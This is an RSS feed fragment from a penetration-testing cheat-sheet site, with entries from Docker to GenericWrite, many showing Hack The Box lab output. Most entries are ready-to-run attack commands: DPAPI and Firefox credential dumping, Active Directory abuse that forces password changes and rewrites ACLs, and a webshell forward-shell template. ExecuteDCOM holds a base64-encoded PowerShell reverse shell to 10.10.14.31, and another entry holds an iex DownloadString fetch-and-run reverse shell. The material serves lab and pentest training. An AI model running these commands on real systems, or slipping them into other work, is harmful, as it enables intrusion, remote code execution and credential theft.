      <description>Linux Windows Zone Transfer dig +noall +answer &amp;lt;DOMAIN&amp;gt; axfr @&amp;lt;TARGET&amp;gt; $ dig +noall +answer snoopy.htb axfr @10.10.11.212 snoopy.htb. 86400 IN SOA ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400 snoopy.htb. 86400 IN NS ns1.snoopy.htb. snoopy.htb. 86400 IN NS ns2.snoopy.htb. mattermost.snoopy.htb. 86400 IN A 172.18.0.3 mm.snoopy.htb. 86400 IN A 127.0.0.1 ns1.snoopy.htb. 86400 IN A 10.0.50.10 ns2.snoopy.htb. 86400 IN A 10.0.51.10 postgres.snoopy.htb. 86400 IN A 172.18.0.2 provisions.snoopy.htb. 86400 IN A 172.18.0.4 www.snoopy.htb. 86400 IN A 127.</description>
    </item>
    <item>
      <title>Docker</title>
      <link>https://tldrbins.github.io/docker/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/docker/</guid>
      <description>Basic Commands # Show all running processes sudo docker ps -a # Show all images sudo docker images -a # Stop all processes sudo docker stop $(sudo docker ps -a -q) # Remove all processes sudo docker rm -vf $(sudo docker ps -a -q) # Remove all images sudo docker rmi -f $(sudo docker images -aq) # Shell in docker sudo docker exec -it &amp;lt;CONTAINER_NAME&amp;gt; sh # Copy file from host to container sudo docker cp &amp;lt;HOST_FILE_PATH&amp;gt; &amp;lt;CONTAINER_ID&amp;gt;:&amp;lt;CONTAINER_FILE_PATH&amp;gt; # Copy file from container to host sudo docker cp &amp;lt;CONTAINER_ID&amp;gt;:&amp;lt;CONTAINER_FILE_PATH&amp;gt; &amp;lt;HOST_FILE_PATH&amp;gt; # Copy folder from host to container sudo docker cp &amp;lt;HOST_FOLDER_PATH&amp;gt;/.</description>
    </item>
    <item>
      <title>Docker Registry</title>
      <link>https://tldrbins.github.io/docker_registry/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/docker_registry/</guid>
      <description>Docker Registry API # List repos curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; &amp;lt;TARGET&amp;gt;/v2/_catalog $ curl -s -k --user &amp;#34;admin:admin&amp;#34; https://docker.registry.htb/v2/_catalog {&amp;#34;repositories&amp;#34;:[&amp;#34;bolt-image&amp;#34;]} # List of tags of this repo curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; &amp;lt;TARGET&amp;gt;/v2/&amp;lt;REPO_NAME&amp;gt;/tags/list $ curl -s -k --user &amp;#34;admin:admin&amp;#34; https://docker.registry.htb/v2/bolt-image/tags/list {&amp;#34;name&amp;#34;:&amp;#34;bolt-image&amp;#34;,&amp;#34;tags&amp;#34;:[&amp;#34;latest&amp;#34;]} # List manifest file for this tag (e.g. latest) curl -s -k --user &amp;#34;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#34; &amp;lt;TARGET&amp;gt;/v2/&amp;lt;REPO_NAME&amp;gt;/manifests/&amp;lt;TAG&amp;gt; $ curl -s -k --user &amp;#34;admin:admin&amp;#34; https://docker.registry.htb/v2/bolt-image/manifests/latest { &amp;#34;schemaVersion&amp;#34;: 1, &amp;#34;name&amp;#34;: &amp;#34;bolt-image&amp;#34;, &amp;#34;tag&amp;#34;: &amp;#34;latest&amp;#34;, &amp;#34;architecture&amp;#34;: &amp;#34;amd64&amp;#34;, &amp;#34;fsLayers&amp;#34;: [ { &amp;#34;blobSum&amp;#34;: &amp;#34;sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b&amp;#34; }, { &amp;#34;blobSum&amp;#34;: &amp;#34;sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee&amp;#34; }, { &amp;#34;blobSum&amp;#34;: &amp;#34;sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c&amp;#34; }, .</description>
    </item>
    <item>
      <title>dotnet</title>
      <link>https://tldrbins.github.io/dotnet/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/dotnet/</guid>
      <description>Compile C# project Linux # Check dotnet --info # Prepare mkdir &amp;lt;PROJECT_NAME&amp;gt; cd &amp;lt;PROJECT_NAME&amp;gt; # Init dotnet new console # Create .sln file dotnet new sln # Link .sln to .csproj dotnet sln &amp;lt;PROJECT_NAME&amp;gt;.sln add &amp;lt;PROJECT_NAME&amp;gt;.csproj # Add dependencies (optional) dotnet add package System.XXXX.XXXX.XXXX --version 1.0.0 +----------------------+ |Add Code to Program.cs| +----------------------+ # Build solution dotnet build -c Release # Run dotnet run Ref: dotnet</description>
    </item>
    <item>
      <title>DPAPI</title>
      <link>https://tldrbins.github.io/dpapi/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/dpapi/</guid>
      <description>Abuse #1: Credentials dump (From Linux) pypykatz DonPAPI 1. Info Gathering cmd /c &amp;#34;dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Local\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Local\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Local\Microsoft\Protect &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Roaming\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Roaming\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Roaming\Microsoft\Protect&amp;#34; 2. Retrieve Keys # Get master key certutil -encode &amp;#34;C:\Users\&amp;lt;USER&amp;gt;\AppData\Roaming\Microsoft\Protect\&amp;lt;SID&amp;gt;\&amp;lt;MASTERKEY&amp;gt;&amp;#34; C:\ProgramData\&amp;lt;MASTERKEY&amp;gt; # Copy and paste to local Linux type C:\ProgramData\&amp;lt;MASTERKEY&amp;gt; # Base64 decode cat masterkey_b64 | base64 -d &amp;gt; masterkey_file # Get credential certutil -encode &amp;#34;C:\Users\&amp;lt;USER&amp;gt;\AppData\Roaming\Microsoft\Credentials\&amp;lt;CREDENTIALS_HASH&amp;gt;&amp;#34; C:\ProgramData\&amp;lt;CREDENTIALS_HASH&amp;gt; # Copy and paste to local Linux type C:\ProgramData\&amp;lt;CREDENTIALS_HASH&amp;gt; # Base64 decode cat credential_b64 | base64 -d &amp;gt; credential_file 3.</description>
    </item>
    <item>
      <title>Drupal</title>
      <link>https://tldrbins.github.io/drupal/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/drupal/</guid>
      <description>Enum droopescan droopescan scan drupal -u &amp;lt;TARGET&amp;gt; Ref: droopescan Note: This can take a long time to run</description>
    </item>
    <item>
      <title>elasticsearch</title>
      <link>https://tldrbins.github.io/elasticsearch/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/elasticsearch/</guid>
      <description>Basic Commands # List indexes curl -s &amp;lt;TARGET&amp;gt;:9200/_cat/indices?v # Dump data with index name curl -s -X GET &amp;#34;&amp;lt;TARGET&amp;gt;:9200/&amp;lt;INDEX_NAME&amp;gt;/_search?size=100&amp;#34; -H &amp;#39;Content-Type: application/json&amp;#39; -d&amp;#39; { &amp;#34;query&amp;#34;: { &amp;#34;match_all&amp;#34;: {} } } &amp;#39; | jq . </description>
    </item>
    <item>
      <title>Electron</title>
      <link>https://tldrbins.github.io/electron/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/electron/</guid>
      <description>Tools sudo npm -g install asar Unpack app.asar # List files asar l &amp;lt;FILE&amp;gt; # Extract all files asar e &amp;lt;FILE&amp;gt; # Extract a file asar ef &amp;lt;FILE&amp;gt; main.js </description>
    </item>
    <item>
      <title>ExecuteDCOM</title>
      <link>https://tldrbins.github.io/executedcom/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/executedcom/</guid>
      <description>Abuse #1: ExecuteDCOM Linux # Revshell impacket-dcomexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; &amp;#39;&amp;lt;POWERSHELL_3_BASE64&amp;gt;&amp;#39; -silentcommand -object MMC20 $ impacket-dcomexec jab.htb/svc_openfire:&amp;#39;!@#$%^&amp;amp;*(1qazxsw&amp;#39;@10.10.11.4 &amp;#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=&amp;#39; -silentcommand -object MMC20 Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra </description>
    </item>
    <item>
      <title>File Transfer (Linux To Linux)</title>
      <link>https://tldrbins.github.io/file_transfer_linux_to_linux/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/file_transfer_linux_to_linux/</guid>
      <description>HTTP nc scp PIPE Base64 # Start a local HTTP server python3 -m http.server &amp;lt;LOCAL_PORT&amp;gt; # In target Linux machine wget &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; # In target Linux machine curl &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -o &amp;lt;REMOTE_DEST_PATH&amp;gt; # In our local Linux machine nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; &amp;lt; &amp;lt;FILE&amp;gt; # In target Linux machine nc -w3 &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt; &amp;gt; &amp;lt;FILE&amp;gt; Remote to Local # With password scp &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_FILE_PATH&amp;gt; &amp;lt;LOCAL_DEST_PATH&amp;gt; # With id_rsa scp -i id_rsa &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_FILE_PATH&amp;gt; &amp;lt;LOCAL_DEST_PATH&amp;gt; Local to Remote # With password scp &amp;lt;LOCAL_FILE_PATH&amp;gt; &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_DEST_PATH&amp;gt; # With id_rsa scp -i id_rsa &amp;lt;LOCAL_FILE_PATH&amp;gt; &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;:&amp;lt;REMOTE_DEST_PATH&amp;gt; Local to Remote # In our local Linux machine cat &amp;lt;FILE&amp;gt; | nc -lnvp &amp;lt;LOCAL_PORT&amp;gt; # In target Linux machine exec 3&amp;lt;&amp;gt;/dev/tcp/&amp;lt;LOCAL_IP&amp;gt;/&amp;lt;LOCAL_PORT&amp;gt; # Ctrl+C to interrupt after some time cat &amp;lt;&amp;amp;3 &amp;gt; &amp;lt;FILE&amp;gt; # Check md5sum &amp;lt;FILE&amp;gt; Small binary # Base64 encode binary cat &amp;lt;FILE&amp;gt; | base64 -w0 # Copy and paste the base64 encoded binary echo -n &amp;#39;&amp;lt;BASE64_FILE&amp;gt;&amp;#39; | base64 -d &amp;gt; &amp;lt;FILE&amp;gt; Note: For restricted environment</description>
    </item>
    <item>
      <title>File Transfer (Linux to Windows)</title>
      <link>https://tldrbins.github.io/file_transfer_linux_to_windows/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/file_transfer_linux_to_windows/</guid>
      <description>Powershell cmd evil-winrm Start a Local HTTP Server python3 -m http.server &amp;lt;LOCAL_PORT&amp;gt; $ python3 -m http.server 8443 Serving HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ... # Invoke-WebRequest iwr http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -o C:\ProgramData\&amp;lt;FILE&amp;gt; # Wget powershell -ep bypass wget &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -Outfile C:\ProgramData\&amp;lt;FILE&amp;gt; # Curl powershell -ep bypass curl &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -Outfile C:\ProgramData\&amp;lt;FILE&amp;gt; Note: curl and wget are alias to Invoke-WebRequest&#xA;# Load into memory and Run # Invoke-Expression iex (New-Object Net.WebClient).DownloadString(&amp;#39;http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt;&amp;#39;);Invoke-PowerShellTcp -Reverse -IPAddress &amp;lt;LOCAL_IP&amp;gt; -Port &amp;lt;LOCAL_PORT&amp;gt; # Short version iex (iwr http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -UseBasicParsing) Ref: rev.</description>
    </item>
    <item>
      <title>File Transfer (Windows To Linux)</title>
      <link>https://tldrbins.github.io/file_transfer_windows_to_linux/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/file_transfer_windows_to_linux/</guid>
      <description>SMB Base64 evil-winrm Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share # Connect to SMB server with creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share /u:&amp;lt;USER&amp;gt; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # From target Windows to local Linux copy &amp;lt;FILE&amp;gt; \\&amp;lt;LOCAL_IP&amp;gt;\share # From local Linux to target Windows copy \\&amp;lt;LOCAL_IP&amp;gt;\share\&amp;lt;FILE&amp;gt; &amp;lt;FILE&amp;gt; # Delete file del &amp;lt;FILE&amp;gt; # Remove SMB share net use /d \\&amp;lt;LOCAL_IP&amp;gt;\share # Older Windows (e.</description>
    </item>
    <item>
      <title>File Transfer (Windows To Windows)</title>
      <link>https://tldrbins.github.io/file_transfer_windows_to_windows/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/file_transfer_windows_to_windows/</guid>
      <description>SMB # Connect to SMB server without creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share # Connect to SMB server with server name net use \\&amp;lt;SERVER_NAME&amp;gt;\share # Connect to SMB server with creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share /u:&amp;lt;USER&amp;gt; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # Mount to a drive with creds net use X: \\&amp;lt;LOCAL_IP&amp;gt;\share /u:&amp;lt;USER&amp;gt; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # From local Windows to target Windows copy &amp;lt;FILE&amp;gt; \\&amp;lt;LOCAL_IP&amp;gt;\share # From target Windows to local Windows copy \\&amp;lt;LOCAL_IP&amp;gt;\share\&amp;lt;FILE&amp;gt; &amp;lt;FILE&amp;gt; # Delete file del &amp;lt;FILE&amp;gt; # Remove SMB share net use /d \\&amp;lt;LOCAL_IP&amp;gt;\share # Remove drive net use /d X: # Older Windows (e.</description>
    </item>
    <item>
      <title>Find</title>
      <link>https://tldrbins.github.io/find/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/find/</guid>
      <description>Linux Locate a file locate &amp;lt;FILE&amp;gt; Find files of type file find . -type f Find and Open find / -name &amp;lt;FILE&amp;gt; -exec cat {} \; Find SUID bit set files find / -type f -user root \( -perm -4000 -o -perm -2000 \) 2&amp;gt;/dev/null -ls Find files owned by user find / -user &amp;lt;USER&amp;gt; -ls 2&amp;gt;/dev/null | grep -v -e &amp;#34; \/proc&amp;#34; -e &amp;#34; \/sys&amp;#34; Find files owned by group find / -group &amp;lt;GROUP&amp;gt; 2&amp;gt;/dev/null | grep -v -e ^/proc Find files created between 1/1/2024 and 31/12/2024 find / -type f -newermt 2024-01-01 !</description>
    </item>
    <item>
      <title>Find (Windows)</title>
      <link>https://tldrbins.github.io/find_windows/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/find_windows/</guid>
      <description>Windows Show hidden files # Show hidden files in current directory Get-ChildItem -Force # Recusive Get-ChildItem -Path &amp;#39;&amp;lt;PATH&amp;gt;&amp;#39; -Recurse -Force 2&amp;gt;$Null Find a file ls -path &amp;#39;&amp;lt;PATH&amp;gt;&amp;#39; -Filter &amp;#39;&amp;lt;FILE&amp;gt;&amp;#39; -recurse -erroraction silent where /R &amp;#39;&amp;lt;PATH&amp;gt;&amp;#39; &amp;#39;&amp;lt;FILE&amp;gt;&amp;#39; # Find files with wildcard Get-ChildItem -Path &amp;#39;&amp;lt;PATH&amp;gt;&amp;#39; -Recurse -Force -Include &amp;#39;&amp;lt;PATTERN&amp;gt;&amp;#39; 2&amp;gt;$Null *Evil-WinRM* PS C:\programdata&amp;gt; Get-ChildItem -Path &amp;#39;C:\&amp;#39; -Recurse -Force -Include &amp;#39;flag.*&amp;#39; 2&amp;gt;$Null Directory: C:\Users\Administrator\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 10/27/2017 4:02 PM 24 flag.</description>
    </item>
    <item>
      <title>Finger Protocol</title>
      <link>https://tldrbins.github.io/finger/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/finger/</guid>
      <description>Basic # Check logged in users finger @&amp;lt;TARGET&amp;gt; # Check valid user finger &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; Brute force usernames perl finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t &amp;lt;TARGET&amp;gt; Ref: finger-user-enum</description>
    </item>
    <item>
      <title>Firefox</title>
      <link>https://tldrbins.github.io/firefox/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/firefox/</guid>
      <description>Browse History Windows # Locate sqlite $firefoxProfile = Get-ChildItem -Path &amp;#34;$env:APPDATA\Mozilla\Firefox\Profiles\&amp;#34; -Directory | Where-Object { $_.Name -like &amp;#34;*.default-release*&amp;#34; }; $historyDb = Join-Path $firefoxProfile.FullName &amp;#34;places.sqlite&amp;#34;; $historyDb Extract saved passwords firefox_decrypt firepwd # Auto detect path python3 firefox_decrypt.py # Specify path python3 firefox_decrypt.py /&amp;lt;PATH&amp;gt;/profiles.ini/ Ref: firefox_decrypt&#xA;# With key4.db, logins.json in the same directory python3 firepwd.py Ref: firepwd</description>
    </item>
    <item>
      <title>Firewall (Windows)</title>
      <link>https://tldrbins.github.io/firewall_windows/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/firewall_windows/</guid>
      <description>Windows Check Firewall Rules powershell cmd&#xA;# Check profiles Get-NetFirewallProfile *Evil-WinRM* PS C:\Users\maria&amp;gt; Get-NetFirewallProfile Name : Domain Enabled : False DefaultInboundAction : NotConfigured DefaultOutboundAction : NotConfigured AllowInboundRules : NotConfigured AllowLocalFirewallRules : NotConfigured AllowLocalIPsecRules : NotConfigured AllowUserApps : NotConfigured AllowUserPorts : NotConfigured AllowUnicastResponseToMulticast : NotConfigured NotifyOnListen : False EnableStealthModeForIPsec : NotConfigured LogFileName : %systemroot%\system32\LogFiles\Firewall\pfirewall.log LogMaxSizeKilobytes : 4096 LogAllowed : False LogBlocked : False LogIgnored : NotConfigured DisabledInterfaceAliases : {NotConfigured} ...[SNIP]... # Check inbound rules Get-NetFirewallRule -Direction InBound -Enabled True PS C:\programdata&amp;gt; Get-NetFirewallRule -Direction Inbound -Enabled True Name : DeliveryOptimization-TCP-In DisplayName : Delivery Optimization (TCP-In) Description : Inbound rule to allow Delivery Optimization to connect to remote endpoints DisplayGroup : Delivery Optimization Group : @%systemroot%\system32\dosvc.</description>
    </item>
    <item>
      <title>Flask Cookie</title>
      <link>https://tldrbins.github.io/flask_cookie/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/flask_cookie/</guid>
      <description>Cookie Tools flask-unsign # Install pip3 install flask-unsign # Decode flask cookie flask-unsign --decode --cookie &amp;lt;COOKIE&amp;gt; # Brute force secret key flask-unsign --unsign --cookie &amp;lt;COOKIE&amp;gt; -w /usr/share/wordlists/rockyou.txt --no-literal-eval # Forge flask cookie flask-unsign --sign --cookie &amp;lt;COOKIE_DATA&amp;gt; --secret &amp;lt;SECRET&amp;gt; </description>
    </item>
    <item>
      <title>ForceChangePassword</title>
      <link>https://tldrbins.github.io/forcechangepassword/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/forcechangepassword/</guid>
      <description>Change target user password (From Linux) BloodyAD rpcclient # Pass password or :hash into PASSWORD bloodyAD -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; set password &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; &amp;#39;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39; bloodyAD -d object.local -u oliver -p &amp;#39;c1cdfun_d2434&amp;#39; --host jenkins.object.local set password smith &amp;#39;Test1234&amp;#39; [+] Password changed successfully! Ref: bloodyAD&#xA;rpcclient -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; -c &amp;#39;setuserinfo2 &amp;lt;TARGET_USER&amp;gt; 23 &amp;lt;NEW_PASSWORD&amp;gt;&amp;#39; $ rpcclient -U &amp;#39;object.local/oliver%c1cdfun_d2434&amp;#39; 10.10.11.132 -c &amp;#39;setuserinfo2 smith 23 Test1234&amp;#39; Change target user password (From Windows) Windows 1.</description>
    </item>
    <item>
      <title>Forward Shell</title>
      <link>https://tldrbins.github.io/forward_shell/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/forward_shell/</guid>
      <description>Python Forward Shell Template #!/usr/bin/env python3 from cmd import Cmd import requests class Term(Cmd): prompt = &amp;#34;shell&amp;gt; &amp;#34; def default(self, args): response = requests.get(&amp;#34;http://example.com/cmd.php&amp;#34;, params = {&amp;#34;cmd&amp;#34;: args}, proxies={&amp;#34;http&amp;#34;:&amp;#34;http://127.0.0.1:8080&amp;#34;}) print(response.text) term = Term() term.cmdloop() </description>
    </item>
    <item>
      <title>FTP</title>
      <link>https://tldrbins.github.io/ftp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ftp/</guid>
      <description>Config Location /etc/vsftpd.conf Basic +---------------------+ | Anonymous login | +---------------------+ | Username: anonymous | | Password: (empty) | +---------------------+ # Connect ftp &amp;lt;TARGET&amp;gt; # Over SSL lftp &amp;lt;TARGET&amp;gt; # Fix cert error echo -n &amp;#39;set ssl:verify-certificate no&amp;#39; &amp;gt;&amp;gt; ~/.lftp/rc # List ls # Switch to binary transfer mode bin # Download get &amp;#34;&amp;lt;FILE&amp;gt;&amp;#34; # Upload put &amp;#34;&amp;lt;FILE&amp;gt;&amp;#34; # Connect over tunnel passive # Exit quit Recusive download # Anonymous login wget -r ftp://anonymous:@&amp;lt;TARGET&amp;gt; # With creds wget --user &amp;lt;USER&amp;gt; --password &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -m ftp://&amp;lt;TARGET&amp;gt; Note: Always check what&amp;rsquo;s in there first</description>
    </item>
    <item>
      <title>GenericAll</title>
      <link>https://tldrbins.github.io/genericall/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/genericall/</guid>
      <description>Abuse #1: Change target user password Linux Windows 1. Add Full Control to current user impacket bloodyAD&#xA;Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . Add Full Control to current user sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; dacledit.py -k &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -principal &amp;lt;USER&amp;gt; -target-dn &amp;#39;OU=&amp;lt;TARGET_GROUP&amp;gt;,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; -inheritance -action write -rights FullControl -use-ldaps $ dacledit.py -k &amp;#39;rebound.htb/oorend:1GR8t@$$4u&amp;#39; -dc-ip 10.10.11.231 -principal oorend -target-dn &amp;#39;OU=SERVICE USERS,DC=REBOUND,DC=HTB&amp;#39; -inheritance -action write -rights FullControl -use-ldaps Impacket v0.</description>
    </item>
    <item>
      <title>GenericWrite</title>
      <link>https://tldrbins.github.io/genericwrite/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/genericwrite/</guid>
      <description>Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to Target User Windows 1. Import PowerView . .\PowerView.ps1 PS C:\programdata&amp;gt; . .\PowerView.ps1 . .\PowerView.ps1 2. Check Target User Get-DomainUser &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; | ConvertFrom-UACValue PS C:\programdata&amp;gt; Get-DomainUser &amp;#39;user&amp;#39; | ConvertFrom-UACValue Get-DomainUser &amp;#39;user&amp;#39; | ConvertFrom-UACValue Name Value ---- ----- NORMAL_ACCOUNT 512 3. Create a Cred Object (runas) [Optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 4. Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; -XOR @{useraccountcontrol=4194304} -Verbose -Credential $Cred PS C:\programdata&amp;gt; Set-DomainObject -Identity &amp;#39;user&amp;#39; -XOR @{useraccountcontrol=4194304} -Verbose -C Set-DomainObject -Identity &amp;#39;user&amp;#39; -XOR @{useraccountcontrol=4194304} -Verbose -Credential $Cred VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain VERBOSE: [Get-Domain] Extracted domain &amp;#39;corp.</description>
    </item>
    <item>
